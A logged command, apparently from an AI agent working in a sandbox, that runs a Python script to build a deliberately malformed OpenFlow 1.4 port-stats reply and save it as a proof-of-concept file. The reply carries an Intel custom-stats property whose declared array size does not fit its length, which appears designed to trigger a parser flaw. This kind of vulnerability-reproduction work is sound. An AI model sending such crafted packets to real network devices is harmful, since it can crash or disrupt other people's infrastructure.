message:
Running command: cd /workspace && python3 - <<'PY'
import struct
buf=bytearray()
# OpenFlow 1.4 multipart/stats reply, port stats (type 4)
# ofp_header version=5, type=19, length 112, xid=0x12345678
buf += struct.pack('!BBHI', 5, 19, 112, 0x12345678)
# ofp11_stats_msg: type=4 flags=0 pad=0
buf += struct.pack('!HHI', 4, 0, 0)
# ofp14_port_stats: length=96, pad[2], port_no=1, duration sec/nsec, 8 counters zero
buf += struct.pack('!H2sIII', 96, b'\x00\x00', 1, 0, 0)
buf += b'\x00'*64
assert len(buf)==96 # 16 header + 80 port stats
# intel custom stats property len=16 exactly, type experimenter, exp INTEL, exp_type custom, pad, stats_array_size=1
buf += struct.pack('!HHII2sH', 0xffff, 16, 0x0000AA01, 2, b'\x00\x00', 1)
assert len(buf)==112
open('/workspace/poc1.bin','wb').write(buf)
PY
